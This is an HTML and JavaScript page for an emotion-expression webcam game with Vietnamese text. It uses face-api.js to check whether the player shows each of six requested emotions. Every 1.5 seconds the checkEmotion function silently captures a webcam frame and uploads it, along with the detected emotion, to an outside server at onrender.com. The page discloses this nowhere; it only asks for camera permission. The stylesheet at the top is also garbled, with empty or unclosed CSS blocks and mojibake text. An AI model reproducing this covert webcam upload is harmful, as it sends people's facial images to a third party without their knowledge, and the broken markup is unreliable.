    #win-message button {

    #win-message button:hover {

    }
    /* M√†u n·ªÅn khi ƒë√∫ng/sai */
    body.correct {
      background-color: #c8e6c9; /* Xanh l√° nh·∫°t */
    }
    body.wrong {

    /* Responsive */
    @media (max-width: 768px) {

    @media (max-width: 480px) {

      }
      #start-button {

        font-size: 0.9rem;
      }
      #request {

      }
      #request span.emoji {

      }
      #progress, #status {

      }
      #win-message {

      }
    }
    /* Hi·ªáu ·ª©ng chuy·ªÉn ƒë·ªông */
    @keyframes bounceIn {
      0% { transform: scale(0.5); opacity: 0; }
      60% { transform: scale(1.2); opacity: 1; }
      100% { transform: scale(1); }
    }
    @keyframes zoomIn {

    }
  </style>
</head>
<body>
  <!-- M√†n h√¨nh b·∫Øt ƒë·∫ßu -->
  <div id="start-screen">
    <h1>Th·ªÉ hi·ªán c·∫£m x√∫c</h1>
    <img src="/assets/game-illustration.png" alt="H√¨nh minh h·ªça tr√≤ ch∆°i">
    <button id="start-button">B·∫Øt ƒë·∫ßu tr√≤ ch∆°i</button>
    <p>Vui l√≤ng cho ph√©p s·ª≠ d·ª•ng camera</p>
  </div>

  <!-- M√†n h√¨nh tr√≤ ch∆°i -->
  <div id="game-screen">
    <p id="progress">Ti·∫øn tr√¨nh: 0/6</p>
    <p id="request">H√£y th·ªÉ hi·ªán c·∫£m x√∫c: <span class="emotion-name"></span> <span class="emoji"></span></p>
    <p id="status">T√¨nh tr·∫°ng c·ªßa b·∫°n: ƒêang ch·ªù...</p>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
  </div>

  <!-- Th√¥ng b√°o chi·∫øn th·∫Øng -->
  <div id="win-message" style="display: none;">
    <p>Ch√∫c m·ª´ng! B·∫°n ƒë√£ chi·∫øn th·∫Øng! üéâ</p>
    <button id="play-again">Ch∆°i l·∫°i</button>
  </div>

  <script>
    const startScreen = document.getElementById('start-screen');
    const gameScreen = document.getElementById('game-screen');
    const startButton = document.getElementById('start-button');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const progressText = document.getElementById('progress');
    const requestText = document.getElementById('request');
    const emotionName = requestText.querySelector('.emotion-name');
    const emoji = requestText.querySelector('.emoji');
    const statusText = document.getElementById('status');
    const winMessage = document.getElementById('win-message');
    const playAgainButton = document.getElementById('play-again');

    // √Çm thanh
    const correctSound = new Audio('/assets/correct.mp3');
    const wrongSound = new Audio('/assets/wrong.mp3');

    // Danh s√°ch c·∫£m x√∫c theo th·ª© t·ª± c·ªë ƒë·ªãnh
    const emotions = [
      { name: 'happy', emoji: 'üòä', mapped: 'happy' },
      { name: 'sad', emoji: 'üò¢', mapped: 'sad' },
      { name: 'angry', emoji: 'üò†', mapped: 'angry' },
      { name: 'surprised', emoji: 'üò≤', mapped: 'surprised' },
      { name: 'neutral', emoji: 'üòê', mapped: 'neutral' },
      { name: 'excited', emoji: 'ü§©', mapped: 'happy' }
    ];

    let currentIndex = 0; // Ch·ªâ s·ªë c·∫£m x√∫c hi·ªán t·∫°i trong danh s√°ch
    const totalEmotions = 6; // S·ªë l∆∞·ª£ng c·∫£m x√∫c c·∫ßn ƒë·∫°t

    // Kh·ªüi ƒë·ªông camera
    function startVideo() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          console.log('Camera ƒë√£ ƒë∆∞·ª£c kh·ªüi ƒë·ªông');
        })
        .catch(err => {
          console.error('L·ªói truy c·∫≠p camera:', err);
          alert('L·ªói truy c·∫≠p camera: ' + err.message);
        });
    }

    // T·∫£i m√¥ h√¨nh face-api.js t·ª´ th∆∞ m·ª•c c·ª•c b·ªô
    Promise.all([
      faceapi.nets.tinyFaceDetector.loadFromUri('/weights'),
      faceapi.nets.faceExpressionNet.loadFromUri('/weights')
    ]).then(() => {
      console.log('M√¥ h√¨nh face-api.js ƒë√£ t·∫£i th√†nh c√¥ng');
    }).catch(err => {
      console.error('L·ªói t·∫£i m√¥ h√¨nh:', err);
      alert('L·ªói t·∫£i m√¥ h√¨nh nh·∫≠n di·ªán khu√¥n m·∫∑t: ' + err.message);
    });

    // B·∫Øt ƒë·∫ßu tr√≤ ch∆°i
    startButton.addEventListener('click', startGame);

    // Ch∆°i l·∫°i
    playAgainButton.addEventListener('click', () => {
      winMessage.style.display = 'none';
      startGame();
    });

    function startGame() {
      currentIndex = 0;
      startScreen.style.display = 'none';
      gameScreen.style.display = 'flex';
      startVideo();
      updateRequest();
      setInterval(checkEmotion, 1500); // Ki·ªÉm tra c·∫£m x√∫c m·ªói 1,5 gi√¢y
    }

    // C·∫≠p nh·∫≠t y√™u c·∫ßu c·∫£m x√∫c
    function updateRequest() {
      const currentEmotion = emotions[currentIndex];
      emotionName.textContent = currentEmotion.name;
      emoji.textContent = currentEmotion.emoji;
      progressText.textContent = `Ti·∫øn tr√¨nh: ${currentIndex}/${totalEmotions}`;
      document.body.className = ''; // Reset m√†u n·ªÅn
      statusText.textContent = 'T√¨nh tr·∫°ng c·ªßa b·∫°n: ƒêang ch·ªù...';
    }

    // Ki·ªÉm tra c·∫£m x√∫c
    async function checkEmotion() {
      // N·∫øu ƒë√£ th·∫Øng, kh√¥ng ki·ªÉm tra th√™m
      if (currentIndex >= totalEmotions) return;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      let detectedEmotion = 'Kh√¥ng ph√°t hi·ªán khu√¥n m·∫∑t';
      let mappedEmotion = '';

      try {
        const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
          .withFaceExpressions();

        if (detections.length > 0) {
          const expressions = detections[0].expressions;
          const maxExpression = Object.keys(expressions).reduce((a, b) =>
            expressions[a] > expressions[b] ? a : b
          );
          detectedEmotion = `Ph√°t hi·ªán: ${maxExpression} (${(expressions[maxExpression] * 100).toFixed(2)}%)`;
          mappedEmotion = maxExpression;

          // So s√°nh c·∫£m x√∫c
          const currentEmotionObj = emotions[currentIndex];
          if (mappedEmotion === currentEmotionObj.mapped) {
            currentIndex++;
            document.body.className = 'correct';
            correctSound.play();
            if (currentIndex < totalEmotions) {
              updateRequest(); // Chuy·ªÉn sang c·∫£m x√∫c ti·∫øp theo
            } else {
              winMessage.style.display = 'flex'; // Hi·ªÉn th·ªã th√¥ng b√°o chi·∫øn th·∫Øng
            }
          } else {
            document.body.className = 'wrong';
            wrongSound.play();
          }
        }
      } catch (err) {
        console.error('L·ªói ph√¢n t√≠ch c·∫£m x√∫c:', err);
        detectedEmotion = 'L·ªói ph√¢n t√≠ch c·∫£m x√∫c';
      }

      // C·∫≠p nh·∫≠t thanh tr·∫°ng th√°i
      statusText.textContent = `T√¨nh tr·∫°ng c·ªßa b·∫°n: ${detectedEmotion}`;

      // G·ª≠i ·∫£nh l√™n server
      const dataUrl = canvas.toDataURL('image/jpeg');
      fetch('https://checkface-0jlo.onrender.com/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: dataUrl, condition: detectedEmotion })
      })
        .then(async response => {
          if (!response.ok) {
            const text = await response.text();
            throw new Error(`Server tr·∫£ v·ªÅ l·ªói ${response.status}: ${text}`);
          }
          return response.json();
        })
        .then(data => {
          console.log('Ph·∫£n h·ªìi t·ª´ server:', data);
        })
        .catch(err => {
          console.error('T·∫£i ·∫£nh l√™n th·∫•t b·∫°i:', err);
          alert('L·ªói khi t·∫£i ·∫£nh l√™n server: ' + err.message);
        });
    }
  </script>
</body>
</html>
